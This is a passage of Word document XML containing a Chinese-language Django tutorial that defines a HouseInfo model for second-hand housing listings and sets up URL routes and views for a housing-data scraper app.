        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#homelink/models.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A983FD2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.db import models</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="077DE380" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60BADF11" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Create your models here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04E2AC4C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06F65E46" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class HouseInfo(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="620D42E1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    title = models.CharField(max_length=256, verbose_name='</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>标题</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D5C88E5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    house = models.CharField(max_length=20, verbose_name='</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>小区</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24984983" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    bedroom = models.CharField(max_length=20, verbose_name='</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>房厅</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="678B7A2D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    area = models.CharField(max_length=20, verbose_name='</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>面积</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27AFD58C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    direction = models.CharField(max_length=20, verbose_name='</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>朝向</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C5C1230" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    floor = models.CharField(max_length=60, verbose_name='</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>朝向</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="563F5A58" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    year = models.CharField(max_length=10, verbose_name='</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>年份</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="755D37E7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    location = models.CharField(max_length=10, verbose_name='</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>位置</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A16749F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    total_price = models.IntegerField(verbose_name='</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>总结</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>万元</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>)')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E177B6D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    unit_price = models.IntegerField(verbose_name='</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>单价</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>元</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>平方米</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>)')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="579F4199" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2892C808" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    add_date = models.DateTimeField(auto_now_add=True, verbose_name="</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>创建日期</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="744C4811" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    mod_date = models.DateTimeField(auto_now=True, verbose_name="</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>修改日期</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1650EDAD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E35F65D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def __str__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36D7551E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return "{}-{}-{}".format(self.house,self.bedroom, self.total_price)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7500145C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="425369DC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    class Meta:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1269C95B" w14:textId="1F19F832" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        verbose_name = "</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>二手房</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F5E7289" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在本例中我们对于面积和年份字段使用了CharField，而不是IntegerField，这是因为房屋面积不一定是整数，而有些二手房年限未知。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="655CE0BD" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5CFA1B65" w14:textId="74E55B77" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>URLConf与视图</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01F9D8B9" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在homelink文件夹下新建一个python文件urls.py，添加以下代码。该urls对应两个视图方法，一个(house_index)用于显示查询选项和爬取结果，一个(house_spider)用于后台爬取数据并存入数据库。我们接下来将分别编写两个视图方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68FBDB51" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#homelink/urls.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46394FA0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.urls import path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="519E2A41" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from . import views</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00D93BAF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C9C71A2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>app_name = 'homelink'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F0BE7DA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12ED7058" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>urlpatterns = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01B94095" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    path('', views.house_index, name='house_index'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A9D5FD6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    path('spider/', views.house_spider, name='house_spider'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C9FAFF2" w14:textId="3AEF5504" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06443E08" w14:textId="3EBFB926" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>显示首页(house_index)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="030C71B5" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>视图中house_index方法对应首页(index)，其作用是渲染表单和显示爬取结果。当数据库已存有爬取数据时(house_list)，分页显示爬取数据。当house_list不存在时，显示带有查询选项的空表单。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F72D418" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#homelink/views.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="075A4639" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from .forms import HouseChoiceForm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FD60A01" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
